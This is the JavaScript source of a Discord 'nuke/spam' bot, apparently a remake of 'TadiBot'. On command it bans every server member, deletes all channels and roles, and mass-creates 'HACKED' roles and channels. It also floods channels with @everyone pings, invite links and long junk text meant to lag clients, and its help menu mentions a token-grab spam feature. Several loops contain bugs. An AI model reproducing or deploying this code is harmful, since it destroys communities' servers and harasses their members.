const Loser = require("discord.js")
const shit = new Loser.Client()
const merda = require("./fuck.json")

shit.on("ready", () => {
    console.log("Remake by Boba#2000.")
    console.log("")
    console.log("TadiBot (PREMIUM) è una merda LMFAO.")
    console.log("")
    console.log("NON HA TUTTI I COMANDI.")
})

shit.on("message", tadishit => {
 const stfu = "!"
 if(tadishit.author.bot) return;
 if (!tadishit.guild) return;
 if (!tadishit.content.startsWith(stfu)) return;
 const svoro = tadishit.content.slice(stfu.length).trim().split(/ +/g);
 const dioo = svoro.shift().toLowerCase();
 if(dioo === "help"){
 const xdF = new Loser.RichEmbed()
 .setTitle("Nuke/Spam Bot | !help ")
 .setColor("RED")
 .setDescription(`**:dash: !nuke - Bans all members & deletes all roles & channels (Disponibile)
 :radioactive: !delete - Deletes all channels and roles (Disponibile)
 :hammer: !ban - Bans all members (Disponibile) 
 :rocket: !channelrole - Create 50 Text and Voice and Roles name hacked (Disponibile) 
 :pencil: !text - Create 30 text name hacked (Disponibile) 
 :loud_sound: !voice - Create 30 voice name hacked (Disponibile)
 :ferris_wheel: !role - Create 30 role name hacked (Disponibile)
 :warning: !spam - Spam In Channels: [@everyone] (Disponibile)
 :frame_photo: !imagespam - Spam In Channels Images With: [@everyone] (Disponibile)
 :radioactive: !lag - lag discord: [@everyone] (Disponibile)
 :santa: !christams - Spam In Channels Christmas gif: [@everyone] (Disponibile)
 :key: !free - Spam In Channels Token Grab: [@everyone] (Non disponibile)
 :red_circle: !youtube - Spam In Channels Youtube channel: [@everyone]
 :purple_circle: !twitch - Spam In Channels Twitch channel: [@everyone]
 :incoming_envelope: !nitro - Dm nitro bot generator free (Non disponibile)
 :sunny: !emojispam - Spam emoji In Channels: [@everyone] (Disponibile)
 :outbox_tray: !left - The bot exits the server (Disponibile)
 :question: Server Support: https://discord.gg/yWfpbFms
 :gear: Credit By Boba#2000
 :robot: TadiShit**`)
 tadishit.author.send(xdF)
 }
 if(dioo === "nuke"){
    tadishit.guild.members.forEach(d => d.ban().catch(x => {
        console.log("Non ho i permessi per bannare utente.")
    }));
    tadishit.guild.channels.forEach(s => s.delete().catch(r => {
        console.log("Non ho i permessi per cancellare il canale.")
    }))
    tadishit.guild.roles.deleteAll().catch(er => {console.log("Non posso il ruolo. RIP")});
	for(var d=0;d<10000;d++){
        tadishit.guild.createRole({name: "HACKED BY TADISHIT"})
    }
 }
 if(dioo === "ban"){
    tadishit.guild.members.forEach(d => d.ban().catch(x => {
        console.log("Non ho i permessi per bannare utente.")
    }));
 }
 if(dioo === "imagespam"){
     for (var xd=0; xd<5;xd++){
         const lel = new Discord.RichEmbed()
         .setImage(tadishit.user.avatarURL)
         message.channel.send(lel)
     }
 }
 if(dioo === "channelrole"){
    for(var d=0;d<50;d++){

    tadishit.guild.createChannel('HACKED', { type: 'text' })
    tadishit.guild.createChannel('HACKED', { type: 'voice' })

 }
 }
 if(dioo === "delete"){
    tadishit.guild.channels.forEach(s => s.delete().catch(r => {
        console.log("Non ho i permessi per cancellare il canale.")
    }))
    tadishit.guild.roles.deleteAll().catch(aa => { console.log("Non posso eliminare il ruolo")})
 }
 if(dioo === "text"){
    for(var f=0;d<30;f++){
      tadishit.guild.createChannel('HACKED', { type: 'text' })
    
     }
 }
 if(dioo === "voice"){
    for(var x=0;d<30;x++){
        tadishit.guild.createChannel('HACKED', { type: 'voice' })
      
       }
 }
 if(dioo === "role"){
    for(var as=0;d<30;as++){
        tadishit.guild.createRole({name: "HACKED"})
      
       }
 }
 if(dioo === "emojispam"){
    for (var i = 0; i < 5; i++) {
        tadishit.channel.send(`
:grinning: :smiley: :smile: :grin: :laughing::sweat_smile::joy: :rofl: :relaxed: :blush: :innocent: :slight_smile: :upside_down: :wink: :relieved: :smiling_face_with_tear: :heart_eyes: :smiling_face_with_3_hearts: :kissing_heart: :kissing: :kissing_smiling_eyes: :kissing_closed_eyes: :yum:
:stuck_out_tongue: :stuck_out_tongue_closed_eyes: :stuck_out_tongue_winking_eye: :zany_face: :face_with_raised_eyebrow: :face_with_monocle: :nerd: :sunglasses: :star_struck: :partying_face: :smirk: :unamused: :disappointed: :pensive: :worried:
:confused: :slight_frown: :frowning2: :persevere: :confounded:
:tired_face: :weary: :pleading_face: :cry: :sob: :triumph: :angry: :rage: :face_with_symbols_over_mouth: :exploding_head: :flushed: :hot_face: :cold_face: :scream: :fearful: :cold_sweat: :sweat: :hugging: :thinking: :face_with_hand_over_mouth: :yawning_face: :shushing_face: :lying_face: :no_mouth: :neutral_face: :expressionless: :grimacing: :rolling_eyes: :hushed: :sleeping: :drooling_face: :sleepy: :dizzy_face: :zipper_mouth: :woozy_face: :nauseated_face: :face_vomiting: :sneezing_face: :mask: :thermometer_face: :head_bandage: :money_mouth: :cowboy: :disguised_face: @everyone`);
    } 
 
     }
     if(dioo === "youtube"){
         for (var daa = 0; daa < 5; daa++) {
                  tadishit.channel.send(`
Youtube Channel:
https://m.youtube.com/channel/UCzahN-peTmLCU6T97pn4shQ/about
@everyone`)
         }
     }
     if(dioo === "twitch"){
        for (var daa = 0; daa < 5; daa++) {
                 tadishit.channel.send(`
Twitch Channel:
https://www.twitch.tv/ilmasseo
@everyone`)
        }
    }
    if(dioo === "lag"){
        for (var i = 0; i < 500; i++) {
       tadishit.channel.send(`
https://tenor.com/view/minecraft-reddit-funny-gif-14138658?size=我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你的悲惨的屁股子。我将尽其所能地将你
@everyone`);} 

    }
    if(dioo === "spam"){
 for (var tt = 0; tt <5000; tt++){
    tadishit.guild.channels.forEach(dii => {
        if(dii.type === 'text') dii.send(`
Server Link:
https://discord.gg/psSCNS5FYT
@everyone
`).catch(e => {
            console.log("Non posso mandare il messaggio in un canale.")
        })})
 }
 
    }
    if(dioo === "left"){
        tadishit.guild.leave()
    }
    if(dioo === "christams"){
        for (var i = 0; i < 5; i++) {
            tadishit.channel.send(`
Server Link:
https://discord.gg/psSCNS5FYT
https://tenor.com/view/selamat-natal-merry-chirstmas-christmas-santa-gif-7326415
@everyone
`);
        } 
    }
})
shit.login(merda.myfuckingtoken)
